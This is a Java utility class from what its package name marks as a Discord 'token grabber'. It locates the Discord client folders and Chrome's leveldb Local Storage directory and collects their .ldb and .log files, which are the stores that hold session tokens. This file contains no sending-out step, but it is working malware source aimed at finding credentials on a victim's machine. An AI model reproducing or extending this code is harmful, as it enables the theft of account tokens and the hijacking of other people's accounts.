package clienttokengrabber.utils;

import java.util.Arrays;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.nio.file.Paths;

public class PathHelper {
    public static final String ROAMING = System.getenv("APPDATA");
    public static final String LOCAL = System.getenv("LOCALAPPDATA");
    private static List<String> clientPaths = new ArrayList<>();
    private static List<String> browserPaths = new ArrayList<>();

    public static List<String> loadClientPaths() {
        addPath(clientPaths, ROAMING, "discord");
        addPath(clientPaths, ROAMING, "discordcanary");
        addPath(clientPaths, ROAMING, "discordptb");

        return clientPaths;
    }

    public static List<String> loadBrowserPaths() {
        addPath(browserPaths, LOCAL, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb");

        return browserPaths;
    }

    private static void addPath(List<String> list, String... elements) {
        list.add(Paths.get(elements[0], Arrays.copyOfRange(elements, 1, elements.length)).toString());
    }

    public static List<File> listValidFiles(String path) {
        List<File> validFiles = new ArrayList<>();

        File directory = new File(path);
        if (!directory.exists()) return validFiles;

        for (File file : directory.listFiles()) {
            String fileName = file.getName();
            if (fileName.endsWith(".ldb") || fileName.endsWith(".log")) validFiles.add(file);
        }

        return validFiles;
    }
}
